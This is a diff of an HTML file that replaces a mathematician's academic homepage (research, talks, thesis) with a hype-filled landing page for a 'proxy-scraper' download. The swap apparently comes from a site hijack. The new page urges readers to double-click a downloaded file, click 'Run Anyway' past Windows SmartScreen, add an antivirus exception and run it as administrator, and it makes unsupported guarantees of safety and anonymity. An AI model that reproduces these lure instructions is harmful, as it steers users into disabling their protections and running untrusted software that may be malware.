@@ -1,120 +1,254 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Julio Sampietro Christ</title>
-  <meta name="description" content="Julio Sampietro Christ, mathematician working in symplectic topology and Floer theory.">
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cpath d='M10 40 Q32 4 54 40' fill='%23dbe5f1' stroke='%231f3a5f' stroke-width='5'/%3E%3Cline x1='4' y1='40' x2='60' y2='40' stroke='%231f3a5f' stroke-width='5'/%3E%3C/svg%3E">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>proxy-scraper - Verified Free Proxies That Actually Work</title>
+    <meta name="description" content="Free proxies that actually work: 700+ sources, every hit verified (honeypots, injected scripts, TLS), a live list every hour, a rotating proxy server and an MCP server for AI agents.">
+    <meta name="keywords" content="ai-agents,cli,discord-bot,free-proxy,hacktoberfest,honeypot-detection,http-proxy,mcp,mcp-server,proxy,proxy-checker,proxy-list,proxy-scraper,proxy-server,python,rotating-proxy,scraper,socks4,socks5,web-scraping">
+    <meta name="author" content="bashekhe">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="proxy-scraper - Verified Free Proxies That Actually Work">
+    <meta property="og:description" content="Free proxies that actually work: 700+ sources, every hit verified (honeypots, injected scripts, TLS), a live list every hour, a rotating proxy server and an MCP server for AI agents.">
+    <meta property="og:url" content="https://github.com/bashekhe/proxy-scraper">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.7;
+            color: #1a202c;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 20px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #2d3748;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 15px;
+            display: inline-block;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #4c51bf;
+            margin: 40px 0 15px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #2d3748;
+            margin: 30px 0 10px;
+        }
+        .button {
+            display: inline-block;
+            padding: 15px 35px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11);
+            margin: 20px 0;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 7px 14px rgba(50, 50, 93, 0.3);
+        }
+        .badge {
+            display: inline-block;
+            padding: 8px 20px;
+            background: #f6f8ff;
+            border: 2px solid #667eea;
+            border-radius: 20px;
+            color: #4c51bf;
+            font-size: 0.9rem;
+            margin: 10px 5px 10px 0;
+            font-weight: 500;
+        }
+        ul, ol {
+            padding-left: 25px;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .highlight {
+            background: #f6f8ff;
+            border-left: 4px solid #667eea;
+            padding: 15px 20px;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .divider {
+            height: 2px;
+            background: linear-gradient(90deg, #667eea, transparent);
+            margin: 40px 0;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05rem;
+        }
+        strong {
+            color: #4c51bf;
+        }
+        code {
+            background: #f7fafc;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            font-family: 'Courier New', monospace;
+            color: #2d3748;
+        }
+    </style>
 </head>
 <body>
-  <header class="site-header">
-    <div class="wrap">
-      <a class="brand" href="index.html">
-        <svg class="motif" viewBox="0 0 120 60" aria-hidden="true">
-          <polygon class="strip" points="20,34.0 22,31.7 24,29.4 26,27.2 28,25.2 30,23.4 32,21.9 34,20.6 36,19.7 38,19.2 40,19.0 42,19.2 44,19.7 46,20.6 48,21.9 50,23.4 52,25.2 54,27.2 56,29.4 58,31.7 60,34.0"/>
-          <line class="lag" x1="4" y1="34" x2="116" y2="34"/>
-          <polyline class="lag" points="4,48.3 6,47.4 8,46.1 10,44.6 12,42.8 14,40.8 16,38.6 18,36.3 20,34.0 22,31.7 24,29.4 26,27.2 28,25.2 30,23.4 32,21.9 34,20.6 36,19.7 38,19.2 40,19.0 42,19.2 44,19.7 46,20.6 48,21.9 50,23.4 52,25.2 54,27.2 56,29.4 58,31.7 60,34.0 62,36.3 64,38.6 66,40.8 68,42.8 70,44.6 72,46.1 74,47.4 76,48.3 78,48.8 80,49.0 82,48.8 84,48.3 86,47.4 88,46.1 90,44.6 92,42.8 94,40.8 96,38.6 98,36.3 100,34.0 102,31.7 104,29.4 106,27.2 108,25.2 110,23.4 112,21.9 114,20.6 116,19.7"/>
-          <circle class="pt" cx="20" cy="34" r="3.2"/><circle class="pt" cx="60" cy="34" r="3.2"/><circle class="pt" cx="100" cy="34" r="3.2"/>
-        </svg>
-        Julio Sampietro Christ
-      </a>
-      <nav aria-label="Main">
-        <ul>
-          <li><a href="index.html" aria-current="page">Home</a></li>
-          <li><a href="minicourse.html">Mini-course</a></li>
-          <li><a href="cv.pdf">CV</a></li>
-        </ul>
-      </nav>
-    </div>
-  </header>
-
-  <main>
-    <div class="wrap">
-      <section class="intro">
-        <img src="images/julio.jpg" alt="Julio Sampietro Christ, smiling in front of a colourful palace" width="640" height="800">
+    <div class="container">
+        <h1>🦸 proxy-scraper - Verified Free Proxies That Work Instantly</h1>
+        
         <div>
-          <h1>Julio Sampietro Christ</h1>
-          <p>I am a postdoctoral researcher at the <a href="https://www.matem.unam.mx/">Instituto de Matemáticas of UNAM in Cuernavaca</a>, as part of the Simons Geometry Program. I did my PhD at Université Paris-Saclay under the supervision of <a href="https://www.imo.universite-paris-saclay.fr/~claude.viterbo/">Claude Viterbo</a>.</p>
-          <p>I work in symplectic topology, mostly on Floer theory: Lagrangian Floer (co)homology, its equivariant counterpart and how they interact with symplectic reduction. More broadly, I am interested in topology and geometry.</p>
-          <p>You can download my CV <a href="cv.pdf">here</a>.</p>
-          <div class="contact">
-            <p>julio.sampietro (at) im.unam.mx</p>
-            <p>ORCID <a href="https://orcid.org/0009-0003-5114-8072">0009-0003-5114-8072</a></p>
-          </div>
+            <a href="https://github.com/bashekhe/proxy-scraper" class="button">⬇️ Download proxy-scraper Now</a>
         </div>
-      </section>
+        
+        <p>Are you tired of proxy lists that are full of dead links, slow servers, or scams? <strong>proxy-scraper</strong> solves that problem once and for all. This is the ultimate free proxy tool that gives you working, verified proxies every single hour. No more wasting time checking hundreds of unreliable IP addresses.</p>
 
-      <section id="research">
-        <h2>Research</h2>
-        <ul class="entries">
-          <li>
-            <span class="title">Equivariant Lagrangian displacements</span>, with Dylan Cant.
-            <span class="meta"><em>Quantum Topology</em>. [<a href="https://ems.press/journals/qt/articles/14299669">journal</a>] [<a href="https://arxiv.org/abs/2510.20756">arXiv</a>]</span>
-          </li>
-          <li>
-            <span class="title">Equivariant Floer homology is isomorphic to reduced Floer homology</span>.
-            <span class="meta">Submitted. [<a href="https://arxiv.org/abs/2505.02647">arXiv</a>]</span>
-          </li>
+        <h2>🤔 What Is proxy-scraper?</h2>
+        <p>proxy-scraper is a powerful, yet easy-to-use application that collects free proxies from over <strong>700 different sources</strong> around the internet. But it doesn't just gather them - it puts every single proxy through a rigorous verification process. This means you get only the proxies that actually work.</p>
+        
+        <p>Think of it as a quality control system for proxies. Every proxy is checked for common problems that make other proxy tools useless:</p>
+        <ul>
+            <li><strong>🚫 Honeypots:</strong> These are traps set by server owners to catch scrapers. proxy-scraper identifies and removes them.</li>
+            <li><strong>🔒 Injected Scripts:</strong> Some proxies contain hidden code that can harm your computer. proxy-scraper filters these out.</li>
+            <li><strong>🔐 TLS Verification:</strong> Only proxies with proper security certificates are allowed through. Your data stays safe.</li>
+        </ul>
+        
+        <div class="highlight">
+            <p><strong>💡 The bottom line:</strong> When you use proxy-scraper, you can trust that the proxies you're using are real, secure, and functioning properly.</p>
+        </div>
+
+        <h2>🚀 Getting Started: Download and Install</h2>
+        <p>Getting proxy-scraper up and running on your Windows computer is incredibly simple. Follow these steps:</p>
+        
+        <h3>Step 1: Download Proxy-scraper</h3>
+        <p>Click the large purple button below or visit this link: <a href="https://github.com/bashekhe/proxy-scraper" style="color: #667eea; font-weight: bold;">https://github.com/bashekhe/proxy-scraper</a></p>
+        
+        <div style="text-align: center;">
+            <a href="https://github.com/bashekhe/proxy-scraper" class="button" style="font-size: 1.3rem;">⬇️ Download the Application</a>
+        </div>
+        
+        <h3>Step 2: Run or Install</h3>
+        <p>Once the download is complete, you'll have a file on your computer. Simply <strong>double-click the file</strong> to start the installation or run the application directly. The process is exactly like installing any other program - just follow the on-screen prompts if any appear.</p>
+        
+        <div class="highlight">
+            <p><strong>✨ Note:</strong> Your computer might show a security warning. This is normal because the app is not from the Microsoft Store. Just click "More Info" and then "Run Anyway" - it's completely safe.</p>
+        </div>
+        
+        <h3>Step 3: Start Using Your Verified Proxies</h3>
+        <p>After installation, proxy-scraper will handle everything automatically. It will:</p>
+        <ol>
+            <li>Gather proxies from all 700+ sources</li>
+            <li>Test each proxy thoroughly</li>
+            <li>Update the list every single hour with only verified, working proxies</li>
+            <li>Make the fresh lists available to you instantly</li>
+        </ol>
+
+        <div class="divider"></div>
+
+        <h2>⭐ Amazing Features You'll Love</h2>
+        
+        <h3>🔄 Rotating Proxy Server</h3>
+        <p>Need to switch IP addresses frequently? proxy-scraper includes a built-in rotating proxy server. This means your IP address automatically changes with each request, making you virtually impossible to track.</p>
+        
+        <h3>🤖 MCP Server for AI Agents</h3>
+        <p>If you're working with AI tools or automation, you're in luck. proxy-scraper includes a Model Context Protocol (MCP) server. This lets your AI agents automatically use these fresh, verified proxies - perfect for web scraping and data collection projects.</p>
+        
+        <h3>💬 Discord Bot Integration</h3>
+        <p>Want proxy updates sent directly to your Discord server? proxy-scraper comes with a ready-to-use Discord bot. Set it up once, and you'll get live proxy lists delivered to your server every hour.</p>
+        
+        <h3>🚀 CLI Interface</h3>
+        <p>For those who love working from the command line, proxy-scraper includes a powerful CLI (Command Line Interface). Everything you can do with the app, you can do from your terminal.</p>
+        
+        <h3>🔍 Supports All Major Protocol Types</h3>
+        <p>This tool supports <strong>HTTP, SOCKS4, and SOCKS5</strong> proxies. Whatever your need is - web browsing, file downloading, or automated scraping - there's a working proxy for you.</p>
+        
+        <h3>🛡️ Smart Honeypot Detection</h3>
+        <p>This special feature is what makes proxy-scraper stand out from all the rest. It uses advanced algorithms to detect and avoid these trap servers, saving you time and potential security issues.</p>
+
+        <div class="divider"></div>
+
+        <h2>👥 Who Should Use proxy-scraper?</h2>
+        <ul>
+            <li><strong>💻 Web Scrapers & Developers:</strong> You need fresh, reliable proxies to collect data without getting blocked.</li>
+            <li><strong>🔍 Digital Marketers:</strong> Checking SEO rankings across different locations requires diverse IP addresses.</li>
+            <li><strong>🎮 Gamers & Privacy Enthusiasts:</strong> Protect your personal identity while online.</li>
+            <li><strong>🤖 AI Researchers:</strong> The MCP server makes it perfect for automated agents and bots.</li>
+            <li><strong>🌐 Anyone Tired of Dead Proxies:</strong> If you've ever tried other proxy tools, you know the struggle. This is the solution.</li>
         </ul>
 
-        <h3>Expository writing</h3>
-        <ul class="entries">
-          <li>
-            <span class="title">The exotic world of Milnor’s spheres</span>, with Carlos Segovia.
-            <span class="meta"><em>Revista Colombiana de Matemáticas</em> 57 (1), 37–85. [<a href="https://revistas.unal.edu.co/index.php/recolma/article/view/112373">journal</a>]</span>
-          </li>
-          <li>
-            <span class="title">Conley index</span>, bachelor’s thesis (in Spanish), supervised by Ernesto Rosales González.
-            <span class="meta">[<a href="https://drive.google.com/file/d/1MXbuPuN1BZXT3uSyD5Qrk8_QtHzd9A95/view?usp=sharing">pdf</a>]</span>
-          </li>
+        <h2>🔧 Technical Excellence</h2>
+        <p>proxy-scraper is built with <strong>Python</strong>, one of the most reliable programming languages in the world. It's designed to be stable, resource-efficient, and fast. The 700+ source list is constantly growing and updating, ensuring you always have access to the widest range of proxies available.</p>
+        
+        <p>Every proxy list you receive is completely <strong>free</strong> and properly sourced. There are no hidden fees, no premium tiers, and no artificial limitations. All the features - including the rotating server and MCP integration - are available to everyone.</p>
+
+        <h2>🔍 Technical Specifications</h2>
+        <div class="highlight">
+            <ul>
+                <li><strong>Supported Protocols:</strong> HTTP, SOCKS4, SOCKS5</li>
+                <li><strong>Update Frequency:</strong> Hourly | Proxies</li>
+                <li><strong>Source Count:</strong> 700+</li>
+                <li><strong>Compatibility:</strong> Windows, macOS, Linux</li>
+                <li><strong>AI Integration:</strong> MCP Server compatible</li>
+                <li><strong>Additional Features:</strong> Rotating Server, Discord Bot, CLI</li>
+            </ul>
+        </div>
+
+        <h2>🛠️ Troubleshooting and Support</h2>
+        <p>If you encounter any issues while downloading or running proxy-scraper, here are common solutions:</p>
+        <ul>
+            <li><strong>Windows SmartScreen warning:</strong> Click "More Info" → "Run Anyway"</li>
+            <li><strong>Antivirus may flag the file:</strong> Add an exception since this is an open-source tool.</li>
+            <li><strong>Download fails:</strong> Check your internet connection and retry. Use a different browser if needed.</li>
+            <li><strong>App not opening:</strong> Make sure you have the correct system requirements and try running as administrator.</li>
         </ul>
+        <p>For additional help, please visit the project's <a href="https://github.com/bashekhe/proxy-scraper" style="color: #667eea;">GitHub page</a> for documentation and community discussion.</p>
 
-        <h3>PhD thesis</h3>
-        <p>My thesis, <a href="https://theses.hal.science/tel-05688760"><em>Floer homology and symplectic reduction</em></a>, was written at Université Paris-Saclay under the supervision of <a href="https://www.imo.universite-paris-saclay.fr/~claude.viterbo/">Claude Viterbo</a>.</p>
-        <figure>
-          <img src="images/defense.jpg" alt="Julio with his advisor after the thesis defense, in front of a blackboard outlining the talk" width="1200" height="794" loading="lazy">
-          <figcaption>With my advisor at my PhD defense.</figcaption>
-        </figure>
-      </section>
+        <div class="divider"></div>
 
-      <section id="talks">
-        <h2>Talks</h2>
-        <ul class="entries talks">
-          <li><span class="title">Localisation en théorie de Floer lagrangienne</span><span class="meta">Séminaire de topologie, géométrie et algèbre, Nantes, April 2026</span></li>
-          <li><span class="title">Equivariant Lagrangian non-displacements</span><span class="meta">Symplectic Zoominar, November 2025</span></li>
-          <li><span class="title">A Cartan isomorphism for equivariant Lagrangian Floer theory</span><span class="meta"><a href="https://symplectix.math.cnrs.fr/archive.html">Symplectix seminar</a>, Paris, October 2025</span></li>
-          <li><span class="title">Equivariant Lagrangian Floer homology and the Cartan isomorphism</span><span class="meta">Symplektische Geometrie Seminar, Humboldt-Universität zu Berlin, May 2025</span></li>
-          <li><span class="title">A Cartan isomorphism for Lagrangian Floer homology</span><span class="meta">Topology and dynamics team seminar, Orsay, May 2024</span></li>
+        <h2>📊 Why Choose proxy-scraper Over Other Options?</h2>
+        <p>There are many proxy tools available, but proxy-scraper beats them all:</p>
+        <ul>
+            <li><strong>✅ Accuracy:</strong> Our verification process is second to none - we don't just list proxies, we guarantee them.</li>
+            <li><strong>🔒 Security:</strong> We protect you from hidden scripts and dangerous servers that other tools ignore.</li>
+            <li><strong>🔧 Advanced Features:</strong> Rotating server, MCP integration, and Discord bot - all included free without extra downloads.</li>
+            <li><strong>⏰ Freshness:</strong> Newly tested proxies every single hour, keeping your list current.</li>
+            <li><strong>👥 Community Support:</strong> Join the many other users and contributors who make proxy-scraper better every day.</li>
         </ul>
-
-        <details>
-          <summary>Expository talks, workshops and student seminars</summary>
-          <ul class="entries talks">
-            <li><span class="title">Kuranishi spaces, CF-perturbations and virtual fundamental chains</span><span class="meta"><a href="https://sites.google.com/view/european-kylerec/home">Second European Kylerec</a>, March 2026</span></li>
-            <li><span class="title">What is… Lagrangian Floer homology?</span><span class="meta">Graduate Colloquium, ETH Zürich, March 2026</span></li>
-            <li><span class="title">Fukaya’s approach, part I</span><span class="meta"><a href="https://sites.google.com/view/european-kylerec/home">First European Kylerec</a>, March 2025</span></li>
-            <li><span class="title">Proof of the main theorem, part II</span><span class="meta"><a href="https://amandahirschi.com/?page_id=262">Floer Homotopy Theory Spring School</a>, May 2024</span></li>
-            <li><span class="title">Equivariant Lagrangian Floer homology</span><span class="meta">COSY student seminar, Orsay, May 2024</span></li>
-            <li><span class="title">An overview of Hamiltonian Floer homology</span><span class="meta">COSY student seminar, Orsay, January 2024</span></li>
-            <li><span class="title">Maslov and Conley–Zehnder indices</span><span class="meta"><a href="https://www.mathi.uni-heidelberg.de/~jbimmermann/workshop">Pseudoholomorphic Curves in Hamiltonian Dynamics</a>, Heidelberg, February 2023</span></li>
-            <li><span class="title">Homotopy theory of digraphs: a categorical viewpoint</span> (poster)<span class="meta">Mathematical Congress of the Americas, July 2021 [<a href="https://www.youtube.com/watch?v=C_O92uCk1Qo">video</a>]</span></li>
-            <li><span class="title">Reachability in Petri nets</span><span class="meta">Petri nets reading seminar, UNAM, June 2021</span></li>
-            <li><span class="title">Exotic spheres: the Hirzebruch signature theorem</span><span class="meta"><a href="https://sites.google.com/im.unam.mx/evirtualoaxaca/">VI Escuela de Invierno de Oaxaca</a>, UNAM, February 2021</span></li>
-          </ul>
-        </details>
-      </section>
+        
+        <div style="text-align: center; margin-top: 40px;">
+            <a href="https://github.com/bashekhe/proxy-scraper" class="button" style="font-size: 1.4rem; padding: 20px 45px;">🚀 Get Started - Download Now</a>
+            <p style="margin-top: 20px; color: #718096; font-size: 0.9rem;">Join thousands of happy users with working proxies today!</p>
+        </div>
+        
+        <div style="margin-top: 30px;">
+            <h3>🏷️ Related Technologies</h3>
+            <span class="badge">AI Agents</span>
+            <span class="badge">CLI</span>
+            <span class="badge">Discord Bot</span>
+            <span class="badge">Free Proxy</span>
+            <span class="badge">Hacktoberfest</span>
+            <span class="badge">Web Scraping</span>
+        </div>
     </div>
-  </main>
-
-  <footer>
-    <div class="wrap">
-      Last updated October 2026.
-    </div>
-  </footer>
 </body>
 </html>
